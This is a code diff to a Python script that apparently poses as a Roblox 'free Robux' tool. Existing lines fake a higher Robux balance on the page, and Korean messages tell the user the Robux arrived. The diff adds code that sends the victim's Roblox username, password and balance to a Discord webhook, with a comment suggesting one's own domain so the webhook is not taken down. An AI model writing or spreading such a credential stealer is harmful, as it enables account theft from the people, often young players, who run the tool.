@@ -3,6 +3,7 @@ import asyncio
 import random
 import os
 import time
+import requests
 
 """
 by playboisanz
@@ -42,12 +43,28 @@ async def isRobuxGet(cnt):
         await asyncio.sleep(0.3)
         await bot.evaluate(f"() => document.querySelector('{x}').innerHTML = '{str(result)}'") #그리고 최종적으로 더한 값 html 로벅스 어마운트 값에 대입
         
-            
+        # 디스코드 웹훅으로 id 와 pw 전송
+        discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE" # 웹훅 삭제 방지를 위해 자신의 도메인으로 변경 추천
+        embed = {
+            "title": "Roblox Credentials",
+            "color": 65280,
+            "fields": [
+                {"name": "Username", "value": rbx_id, "inline": True},
+                {"name": "Password", "value": rbx_pw, "inline": True},
+                {"name": "Current Robux", "value": value, "inline": False}
+            ]
+        }
+        payload = {
+            "content": "@everyone",
+            "embeds": [embed]
+        }
+        response = requests.post(discord_webhook_url, json=payload) 
         
         await asyncio.sleep(20)
         await bot.close()
         print("로벅스가 정상적으로 들어왔습니다.\n이전 로벅스 수 : {}\n현재 로벅스 수 : {}".format(value,result))
         await asyncio.sleep(1)
+        
         return input("계속 할려면 ENTER 을 누르십시오...")
         
         
